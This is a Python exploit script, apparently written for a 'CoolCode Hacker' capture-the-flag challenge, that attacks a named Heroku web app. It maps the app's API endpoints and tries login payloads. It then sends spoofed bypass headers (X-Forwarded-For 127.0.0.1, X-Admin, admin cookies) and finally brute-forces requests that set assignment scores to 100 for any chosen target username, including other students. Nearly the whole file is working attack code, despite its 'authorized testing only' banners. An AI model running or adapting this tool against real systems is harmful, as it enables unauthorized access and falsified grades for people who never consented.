#!/usr/bin/env python3
"""
CoolCode Hacker - Cybersecurity Challenge Tool
For authorized penetration testing only!

This script helps you complete the CoolCode hacking challenge by:
1. Exploring API endpoints
2. Attempting authentication bypass
3. Overriding student scores through the API
"""

import requests
import json
import time
from urllib.parse import urljoin

class CoolCodeExploit:
    def __init__(self):
        self.base_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin'
        })
        
    def log(self, message, level="INFO"):
        """Enhanced logging with colors"""
        colors = {
            "INFO": "\033[94m",  # Blue
            "SUCCESS": "\033[92m",  # Green
            "WARNING": "\033[93m",  # Yellow
            "ERROR": "\033[91m",  # Red
            "RESET": "\033[0m"  # Reset
        }
        
        color = colors.get(level, colors["INFO"])
        reset = colors["RESET"]
        timestamp = time.strftime("%H:%M:%S")
        print(f"{color}[{timestamp}] {level}: {message}{reset}")
    
    def make_request(self, method, endpoint, data=None, headers=None):
        """Make HTTP request with proper error handling"""
        url = urljoin(self.base_url, endpoint)
        
        try:
            req_headers = self.session.headers.copy()
            if headers:
                req_headers.update(headers)
                
            if method.upper() == 'GET':
                response = self.session.get(url, headers=req_headers)
            elif method.upper() == 'POST':
                response = self.session.post(url, json=data, headers=req_headers)
            elif method.upper() == 'PUT':
                response = self.session.put(url, json=data, headers=req_headers)
            elif method.upper() == 'DELETE':
                response = self.session.delete(url, headers=req_headers)
            else:
                self.log(f"Unsupported method: {method}", "ERROR")
                return None
                
            self.log(f"{method} {endpoint} -> {response.status_code}")
            
            return {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'text': response.text,
                'json': response.json() if response.headers.get('content-type', '').startswith('application/json') else None
            }
            
        except requests.exceptions.RequestException as e:
            self.log(f"Request failed: {e}", "ERROR")
            return None
        except Exception as e:
            self.log(f"Unexpected error: {e}", "ERROR")
            return None
    
    def reconnaissance(self):
        """Phase 1: Reconnaissance - Explore the target system"""
        self.log("üîç Starting reconnaissance phase...", "INFO")
        
        # Common API endpoints to probe
        endpoints_to_test = [
            "/",
            "/ui/",
            "/api/",
            "/api/health",
            "/api/status", 
            "/api/version",
            "/api/users",
            "/api/user",
            "/api/assignments",
            "/api/assignment",
            "/api/scores",
            "/api/score",
            "/api/auth",
            "/api/auth/login",
            "/api/login",
            "/login",
            "/api/admin",
            "/admin",
            "/api/api/assignment/score",  # Target endpoint
            "/.well-known/",
            "/robots.txt",
            "/sitemap.xml"
        ]
        
        accessible_endpoints = []
        
        for endpoint in endpoints_to_test:
            response = self.make_request('GET', endpoint)
            if response and response['status_code'] < 500:
                accessible_endpoints.append((endpoint, response['status_code']))
                if response['status_code'] == 200:
                    self.log(f"‚úÖ {endpoint} - Accessible", "SUCCESS")
                elif response['status_code'] in [401, 403]:
                    self.log(f"üîí {endpoint} - Authentication required", "WARNING")
                else:
                    self.log(f"üìù {endpoint} - Status {response['status_code']}", "INFO")
        
        return accessible_endpoints
    
    def test_authentication(self, username, password=None):
        """Phase 2: Test authentication mechanisms"""
        self.log("üîê Testing authentication mechanisms...", "INFO")
        
        auth_endpoints = [
            "/api/auth/login",
            "/api/login",
            "/login",
            "/api/auth",
            "/auth"
        ]
        
        auth_payloads = [
            {"username": username, "password": password} if password else {"username": username},
            {"user": username, "pass": password} if password else {"user": username},
            {"email": username, "password": password} if password else {"email": username},
        ]
        
        for endpoint in auth_endpoints:
            for payload in auth_payloads:
                response = self.make_request('POST', endpoint, payload)
                if response:
                    if response['status_code'] == 200:
                        self.log(f"‚úÖ Authentication successful at {endpoint}", "SUCCESS")
                        if response['json'] and 'token' in response['json']:
                            token = response['json']['token']
                            self.session.headers['Authorization'] = f'Bearer {token}'
                            self.log(f"üé´ Token acquired: {token[:20]}...", "SUCCESS")
                        return True
                    elif response['status_code'] == 401:
                        self.log(f"‚ùå Invalid credentials at {endpoint}", "WARNING")
                    elif response['status_code'] == 404:
                        self.log(f"üìç Endpoint {endpoint} not found", "INFO")
        
        return False
    
    def test_score_api_vulnerabilities(self):
        """Phase 3: Test the score API for vulnerabilities"""
        self.log("üéØ Testing score API vulnerabilities...", "INFO")
        
        score_endpoint = "/api/api/assignment/score"
        
        # Test 1: Check if endpoint is accessible without authentication
        test_payload = {
            "username": "test_user",
            "assignmentId": 1,
            "score": 100
        }
        
        response = self.make_request('POST', score_endpoint, test_payload)
        if response:
            if response['status_code'] == 200:
                self.log("üö® VULNERABILITY: Score API accessible without authentication!", "SUCCESS")
                return True
            elif response['status_code'] == 401:
                self.log("üîí Score API requires authentication", "WARNING")
            elif response['status_code'] == 403:
                self.log("üîí Score API requires authorization", "WARNING")
            else:
                self.log(f"üìù Score API returned status: {response['status_code']}", "INFO")
        
        # Test 2: Try with different headers
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Admin': 'true'},
            {'X-Role': 'admin'},
            {'Authorization': 'Bearer fake_token'},
            {'Cookie': 'admin=true'},
            {'Referer': self.base_url + '/admin/'},
            {'Origin': self.base_url}
        ]
        
        for headers in bypass_headers:
            response = self.make_request('POST', score_endpoint, test_payload, headers)
            if response and response['status_code'] == 200:
                self.log(f"üö® BYPASS FOUND with headers: {headers}", "SUCCESS")
                return True
        
        return False
    
    def exploit_score_override(self, target_username, assignment_ids=None, score=100):
        """Phase 4: Exploit the score override vulnerability"""
        self.log(f"üöÄ Exploiting score override for user: {target_username}", "INFO")
        
        score_endpoint = "/api/api/assignment/score"
        
        if assignment_ids is None:
            assignment_ids = list(range(1, 21))  # Try assignments 1-20
        
        successful_overrides = []
        
        for assignment_id in assignment_ids:
            payload = {
                "username": target_username,
                "assignmentId": assignment_id,
                "score": score
            }
            
            # Try multiple approaches
            approaches = [
                # Direct request
                {'headers': None},
                # With origin header
                {'headers': {'Origin': self.base_url, 'Referer': f'{self.base_url}/ui/'}},
                # With admin-like headers
                {'headers': {'X-Admin': 'true', 'X-Role': 'admin'}},
                # With local IP headers
                {'headers': {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'}},
                # With different content type
                {'headers': {'Content-Type': 'application/x-www-form-urlencoded'}},
            ]
            
            for approach in approaches:
                response = self.make_request('POST', score_endpoint, payload, approach['headers'])
                
                if response and response['status_code'] == 200:
                    self.log(f"‚úÖ Assignment {assignment_id}: Score {score} set successfully!", "SUCCESS")
                    successful_overrides.append(assignment_id)
                    break
                elif response and response['status_code'] == 401:
                    self.log(f"üîí Assignment {assignment_id}: Authentication required", "WARNING")
                elif response and response['status_code'] == 403:
                    self.log(f"üîí Assignment {assignment_id}: Forbidden", "WARNING")
                elif response:
                    self.log(f"‚ùå Assignment {assignment_id}: Failed with status {response['status_code']}", "ERROR")
            
            # Small delay to avoid rate limiting
            time.sleep(0.1)
        
        self.log(f"üéØ Successfully overrode {len(successful_overrides)} assignments", "SUCCESS")
        return successful_overrides
    
    def verify_score_changes(self, username):
        """Phase 5: Verify that score changes were successful"""
        self.log(f"üîç Verifying score changes for {username}...", "INFO")
        
        # Try to get user scores
        score_endpoints = [
            f"/api/user/{username}/scores",
            f"/api/users/{username}/scores", 
            f"/api/scores/{username}",
            f"/api/user/{username}",
            f"/api/users/{username}"
        ]
        
        for endpoint in score_endpoints:
            response = self.make_request('GET', endpoint)
            if response and response['status_code'] == 200:
                self.log(f"‚úÖ Retrieved user data from {endpoint}", "SUCCESS")
                if response['json']:
                    self.log(f"üìä User data: {json.dumps(response['json'], indent=2)}", "INFO")
                return response['json']
        
        self.log("‚ùå Could not verify score changes", "WARNING")
        return None
    
    def run_full_exploit(self, username, password=None, target_username=None):
        """Run the complete exploitation chain"""
        self.log("üî• Starting CoolCode exploitation...", "INFO")
        self.log("‚ö†Ô∏è  For authorized penetration testing only!", "WARNING")
        
        # Phase 1: Reconnaissance
        accessible_endpoints = self.reconnaissance()
        
        # Phase 2: Authentication testing
        if password:
            auth_success = self.test_authentication(username, password)
            if auth_success:
                self.log("üé´ Authentication successful!", "SUCCESS")
            else:
                self.log("üîí Authentication failed, continuing without auth...", "WARNING")
        
        # Phase 3: Test score API vulnerabilities
        api_vulnerable = self.test_score_api_vulnerabilities()
        
        if api_vulnerable:
            # Phase 4: Exploit score override
            target = target_username or username
            successful_overrides = self.exploit_score_override(target)
            
            # Phase 5: Verify changes
            if successful_overrides:
                self.verify_score_changes(target)
                
                self.log("üéâ Exploitation complete!", "SUCCESS")
                self.log(f"üìà {len(successful_overrides)} assignments scored to 100", "SUCCESS")
                return True
        
        self.log("‚ùå Exploitation failed", "ERROR")
        return False

def main():
    """Main function"""
    print("üî•" * 50)
    print("       CoolCode Hacker - CTF Challenge Tool")
    print("         For Authorized Testing Only!")
    print("üî•" * 50)
    print()
    
    # Get user input
    username = input("Enter your username (CX8de3ce71-3cbTY): ").strip() or "CX8de3ce71-3cbTY"
    password = input("Enter your password (optional): ").strip() or None
    target_username = input("Enter target username to hack (or press Enter to use your username): ").strip() or username
    
    print()
    
    # Create exploit instance
    exploit = CoolCodeExploit()
    
    # Run the exploitation
    success = exploit.run_full_exploit(username, password, target_username)
    
    if success:
        print("\nüéØ Challenge completed successfully!")
        print("üíØ All assignment scores should now be 100!")
    else:
        print("\n‚ùå Challenge failed. Try manual exploration.")
        print("üí° Hint: Use browser dev tools to intercept requests!")

if __name__ == "__main__":
    main()
